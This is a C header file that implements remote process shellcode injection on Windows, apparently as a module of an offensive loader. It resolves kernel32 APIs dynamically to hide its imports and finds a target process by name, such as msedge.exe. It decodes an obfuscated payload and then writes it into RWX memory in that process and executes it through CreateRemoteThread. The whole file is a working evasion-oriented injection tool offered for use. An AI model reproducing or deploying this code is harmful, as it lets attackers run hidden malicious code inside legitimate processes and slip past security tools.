#pragma once 

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include "../debug_print/debug_print.h"

// Define function pointers for the APIs we will load dynamically
typedef HANDLE(WINAPI* pfnCREATETOOLHELP32SNAPSHOT)(DWORD, DWORD);
typedef BOOL(WINAPI* pfnPROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pfnPROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
typedef LPVOID(WINAPI* pfnVIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pfnWRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pfnCREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* pfnOPENPROCESS)(DWORD, BOOL, DWORD);

pfnCREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot = NULL;
pfnPROCESS32FIRST pProcess32First = NULL;
pfnPROCESS32NEXT pProcess32Next = NULL;
pfnVIRTUALALLOCEX pVirtualAllocEx = NULL;
pfnWRITEPROCESSMEMORY pWriteProcessMemory = NULL;
pfnCREATEREMOTETHREAD pCreateRemoteThread = NULL;
pfnOPENPROCESS pOpenProcess = NULL;

// Load all APIs dynamically
void LoadAPIs() {
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    HMODULE hUser32 = GetModuleHandle("user32.dll");

    pCreateToolhelp32Snapshot = (pfnCREATETOOLHELP32SNAPSHOT)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32First = (pfnPROCESS32FIRST)GetProcAddress(hKernel32, "Process32First");
    pProcess32Next = (pfnPROCESS32NEXT)GetProcAddress(hKernel32, "Process32Next");
    pVirtualAllocEx = (pfnVIRTUALALLOCEX)GetProcAddress(hKernel32, "VirtualAllocEx");
    pWriteProcessMemory = (pfnWRITEPROCESSMEMORY)GetProcAddress(hKernel32, "WriteProcessMemory");
    pCreateRemoteThread = (pfnCREATEREMOTETHREAD)GetProcAddress(hKernel32, "CreateRemoteThread");
    pOpenProcess = (pfnOPENPROCESS)GetProcAddress(hKernel32, "OpenProcess");
}

void custom_decrypt(unsigned char *buf, const int buf_length) {
	for(int i = 0; i < buf_length; i++) {
		buf[i] = buf[i] - 0xFE;
	}	
}


int FindTarget(char* procname) { // Changed to wchar_t for Unicode

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!pProcess32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (pProcess32Next(hProcSnap, &pe32)) {
        if (lstrcmpi(procname, pe32.szExeFile) == 0) { // Changed to lstrcmpiW for Unicode
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

// payload_info format:     msedge.exe
// the name specifies the process to inject the shellcode into.
void inject_shellcode_procname_dyn_lib(unsigned char *shellcode, int shellcode_size, char *payload_info) {
    DEBUG_PRINT("Starting inject_shellcode_procname_dyn_lib routine...\n");  
    DEBUG_PRINT("Loading dynamically APIs...\n");   
    LoadAPIs();  // Ensure APIs are loaded before use

    int target_pid = 0;
    char *target_process = payload_info;
    DEBUG_PRINT("Extracted payload_info::process_name argument = %s\n", target_process);

    DEBUG_PRINT("Finding target PID...\n");
    target_pid = FindTarget(target_process);

    if (target_pid == 0){
        DEBUG_PRINT("Failed to find PID of targeted process.\n");
        return;
    }

    // Access target process
    DEBUG_PRINT("Accessing target process...\n");
    HANDLE h_proc = pOpenProcess((PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ), FALSE, target_pid);

    if(h_proc == NULL) {
        DEBUG_PRINT("Failed to retrieve handle.\n");
        return;
    }

    // Allocate target memory for the shellcode
    DEBUG_PRINT("Allocating memory in target process...\n");
    PVOID remote_buffer = pVirtualAllocEx(h_proc, NULL, (SIZE_T) shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
    if(remote_buffer == NULL) {
        DEBUG_PRINT("Memory allocation failed.\n");
        return;
    }

    DEBUG_PRINT("Decrypting payload\n");
    // Decrypt payload
    custom_decrypt(shellcode, shellcode_size);

    // Write shellcode into allocated target buffer
    DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");    
    if(pWriteProcessMemory(h_proc, remote_buffer, (PBYTE) shellcode, (SIZE_T) shellcode_size, NULL) == 0) {
        DEBUG_PRINT("Write operation failed.\n");
        return;
    }
    
    // Create and start new thread in the remote process, executing the shellcode
    DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
    HANDLE h_remote_thread = pCreateRemoteThread(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE) remote_buffer, NULL, 0, NULL);
    if(h_remote_thread == NULL) {
        DEBUG_PRINT("Thread creation failed.\n");
        return;
    }

    CloseHandle(h_proc);
}
